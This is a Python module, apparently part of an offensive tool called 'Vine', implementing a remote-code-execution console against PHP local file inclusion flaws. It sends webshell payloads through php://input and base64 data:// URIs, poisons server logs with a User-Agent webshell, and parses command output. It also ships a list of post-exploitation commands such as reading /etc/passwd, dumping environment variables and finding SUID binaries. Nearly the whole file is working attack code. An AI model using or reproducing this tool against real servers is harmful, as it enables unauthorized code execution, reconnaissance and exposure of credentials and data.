"""
Vine · core/rce.py
RCE-консоль для эксплуатации php://input и других техник выполнения кода.

Поддерживаемые векторы:
  php_input   — POST body как PHP: <?php system('cmd'); ?>
  php_eval    — eval() через LFI параметр
  log_poison  — выполнение через отравленный лог
  data_rce    — data://text/plain;base64,...
"""

from __future__ import annotations

import base64
import re
import time
from dataclasses import dataclass, field
from typing import Callable

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# ── Результат выполнения команды ─────────────────────────────────────────────

@dataclass
class RCEResult:
    command: str
    output: str
    vector: str
    url: str
    elapsed_ms: int
    success: bool
    timestamp: float = field(default_factory=time.time)
    error: str = ""


# ── Конфигурация RCE-сессии ───────────────────────────────────────────────────

@dataclass
class RCESession:
    """Параметры активной RCE-сессии."""
    target_url: str           # базовый URL уязвимого приложения
    param: str                # уязвимый параметр
    lfi_payload: str          # payload который сработал (напр. php://input)
    vector: str               # php_input / data_rce / log_poison
    method: str = "POST"
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    proxy: str | None = None
    timeout: int = 15

    # Для log_poison — путь к логу и working payload
    log_path: str = ""
    log_lfi_payload: str = ""


# ── PHP-шаблоны ───────────────────────────────────────────────────────────────

# Минимальный шелл — выводит маркеры для надёжного парсинга
_PHP_SYSTEM   = "<?php echo '---VINE---'; system('{cmd}'); echo '---END---'; ?>"
_PHP_PASSTHRU = "<?php echo '---VINE---'; passthru('{cmd}'); echo '---END---'; ?>"
_PHP_SHELL    = "<?php echo '---VINE---'; shell_exec('{cmd}'); echo '---END---'; ?>"

# data:// payload с маркерами
def _make_data_payload(cmd: str) -> str:
    php = f"<?php echo '---VINE---'; system('{cmd}'); echo '---END---'; ?>"
    return "data://text/plain;base64," + base64.b64encode(php.encode()).decode()


# ── Движок ───────────────────────────────────────────────────────────────────

class RCEEngine:
    """
    Отправляет команды на сервер через найденный RCE-вектор.

    on_result(RCEResult) — коллбэк для UI
    """

    def __init__(
        self,
        session: RCESession,
        on_result: Callable[[RCEResult], None] | None = None,
    ):
        self._session = session
        self.on_result = on_result or (lambda r: None)
        self._http = self._build_http()

    def execute(self, cmd: str) -> RCEResult:
        """Выполняет команду и возвращает результат."""
        cmd = cmd.strip()
        if not cmd:
            return RCEResult("", "", self._session.vector, "", 0, False, error="empty command")

        t0 = time.monotonic()
        try:
            if self._session.vector == "php_input":
                result = self._exec_php_input(cmd)
            elif self._session.vector == "data_rce":
                result = self._exec_data(cmd)
            elif self._session.vector == "log_poison":
                result = self._exec_log_poison(cmd)
            else:
                result = self._exec_php_input(cmd)  # fallback
        except Exception as e:
            elapsed = int((time.monotonic() - t0) * 1000)
            result = RCEResult(
                command=cmd, output="", vector=self._session.vector,
                url=self._session.target_url, elapsed_ms=elapsed,
                success=False, error=str(e),
            )

        self.on_result(result)
        return result

    # ── Векторы ──────────────────────────────────────────────────────────────

    def _exec_php_input(self, cmd: str) -> RCEResult:
        """
        php://input — POST body выполняется как PHP.
        Параметр = php://input, тело = PHP-код.
        """
        import urllib.parse
        s = self._session

        php_body = _PHP_SYSTEM.format(cmd=cmd.replace("'", "\\'"))

        # URL с параметром = php://input
        parsed = urllib.parse.urlparse(s.target_url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[s.param] = ["php://input"]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        url = urllib.parse.urlunparse(parsed._replace(query=new_query))

        t0 = time.monotonic()
        resp = self._http.post(
            url,
            data=php_body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=s.timeout,
            verify=False,
            allow_redirects=True,
        )
        elapsed = int((time.monotonic() - t0) * 1000)

        output, success = self._parse_output(resp.text)
        return RCEResult(
            command=cmd, output=output, vector="php_input",
            url=url, elapsed_ms=elapsed, success=success,
            error="" if success else "no output markers found",
        )

    def _exec_data(self, cmd: str) -> RCEResult:
        """data://text/plain;base64,... через GET."""
        import urllib.parse
        s = self._session

        payload = _make_data_payload(cmd)
        parsed = urllib.parse.urlparse(s.target_url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[s.param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        url = urllib.parse.urlunparse(parsed._replace(query=new_query))

        t0 = time.monotonic()
        resp = self._http.get(url, timeout=s.timeout, verify=False)
        elapsed = int((time.monotonic() - t0) * 1000)

        output, success = self._parse_output(resp.text)
        return RCEResult(
            command=cmd, output=output, vector="data_rce",
            url=url, elapsed_ms=elapsed, success=success,
        )

    def _exec_log_poison(self, cmd: str) -> RCEResult:
        """
        Log Poisoning RCE:
        1. Отравляем лог User-Agent с webshell
        2. Читаем лог через LFI с ?cmd=
        """
        import urllib.parse
        s = self._session

        # Шаг 1: отравить лог
        shell = "<?php system($_GET['cmd']); ?>"
        self._http.get(
            s.target_url,
            headers={"User-Agent": shell},
            timeout=s.timeout, verify=False,
        )

        # Шаг 2: читать лог + выполнить команду
        parsed = urllib.parse.urlparse(s.target_url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[s.param] = [s.log_lfi_payload]
        qs["cmd"] = [cmd]
        url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(qs, doseq=True))
        )

        t0 = time.monotonic()
        resp = self._http.get(url, timeout=s.timeout, verify=False)
        elapsed = int((time.monotonic() - t0) * 1000)

        # Для log poison — ищем вывод команды (uid=, etc.)
        body = resp.text
        patterns = [r"uid=\d+", r"root", r"www-data"]
        success = any(re.search(p, body) for p in patterns)
        # Пробуем вытащить строку с uid
        m = re.search(r"uid=\d+\([^)]+\)\s*gid=\d+[^\n]*", body)
        output = m.group(0) if m else (body[:500] if success else "")

        return RCEResult(
            command=cmd, output=output, vector="log_poison",
            url=url, elapsed_ms=elapsed, success=success,
        )

    # ── Парсинг ──────────────────────────────────────────────────────────────

    @staticmethod
    def _parse_output(body: str) -> tuple[str, bool]:
        """Извлекает вывод между маркерами ---VINE--- и ---END---."""
        m = re.search(r"---VINE---(.*?)---END---", body, re.DOTALL)
        if m:
            return m.group(1).strip(), True

        # Fallback: ищем типичные паттерны вывода команд
        patterns = [
            r"uid=\d+\([^)]+\)[^\n]*",
            r"Linux [^\n]+",
            r"total \d+\n(?:drwx|lrwx|-rwx)[^\n]+",
        ]
        for pat in patterns:
            fm = re.search(pat, body)
            if fm:
                return fm.group(0).strip(), True

        return "", False

    def _build_http(self) -> requests.Session:
        s = self._session
        http = requests.Session()
        http.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            **s.headers,
        })
        http.cookies.update(s.cookies)
        if s.proxy:
            http.proxies = {"http": s.proxy, "https": s.proxy}
        return http


# ── Быстрые команды ───────────────────────────────────────────────────────────

QUICK_COMMANDS = [
    ("id",                    "текущий пользователь"),
    ("whoami",                "имя пользователя"),
    ("uname -a",              "версия ядра"),
    ("cat /etc/passwd",       "список пользователей"),
    ("cat /etc/hosts",        "hosts файл"),
    ("ls -la /",              "корневая директория"),
    ("ls -la /home",          "домашние директории"),
    ("ls -la /var/www/html",  "веб-директория"),
    ("find / -name flag.txt 2>/dev/null",  "найти flag.txt"),
    ("find / -perm -4000 2>/dev/null",     "SUID бинари"),
    ("cat /proc/version",     "версия Linux"),
    ("env",                   "переменные окружения"),
    ("ps aux",                "процессы"),
    ("netstat -tlnp 2>/dev/null || ss -tlnp", "открытые порты"),
    ("cat /etc/crontab",      "cron задачи"),
]

# Определить вектор по найденному payload
def detect_vector(payload_technique: str, payload_raw: str) -> str:
    if "php://input" in payload_raw:
        return "php_input"
    if "data://" in payload_raw:
        return "data_rce"
    if payload_technique == "log_poison":
        return "log_poison"
    return "php_input"  # default
